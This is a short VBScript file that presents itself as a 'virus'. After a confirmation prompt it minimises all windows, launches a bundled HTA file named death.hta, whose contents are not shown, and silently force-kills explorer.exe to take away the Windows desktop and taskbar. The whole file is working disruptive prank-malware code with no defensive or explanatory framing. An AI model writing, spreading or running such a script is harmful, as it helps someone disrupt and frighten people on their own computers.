Dim userResponse
Dim objShell

Set objShell = CreateObject("Shell.Application")
objShell.MinimizeAll

userResponse = MsgBox("This virus is not a joke. Do you really want to proceed?", vbYesNo + vbCritical, "Warning")

If userResponse = vbNo Then
    WScript.Quit
Else
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "assets\death.hta"
    objShell.Run "taskkill /f /im explorer.exe", 0, True
End If
